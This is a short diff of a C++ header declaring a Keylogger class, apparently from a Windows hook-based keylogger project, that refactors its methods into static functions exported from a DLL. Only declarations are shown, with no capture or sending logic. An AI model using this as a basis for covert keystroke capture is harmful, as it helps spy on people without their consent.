@@ -6,24 +6,23 @@
 #ifndef _KEYLOGGER_H
 #define _KEYLOGGER_H
 
-#include <iostream>
-#include <vector>
-
 #include "AEvent.h"
 #include "EventManager.h"
 #include "HookHandler.h"
+#include "KeyloggerDLL.h"
 
-class __declspec(dllexport)  Keylogger {
+class Keylogger {
 public: 
 	static Keylogger _instance;
 
 public:
-    Keylogger();  
-    bool init();   
-    void run();
-    bool stop();
-    bool kill();
-    static Keylogger& getInstance();
+    Keylogger();
+	~Keylogger();
+    static KEYLOGGERDLL bool init();   
+    static KEYLOGGERDLL void run();
+    static KEYLOGGERDLL bool stop();
+    static KEYLOGGERDLL bool kill();
+    static KEYLOGGERDLL Keylogger& getInstance();
     bool pushToQueue(AEvent*);
 
 private: 
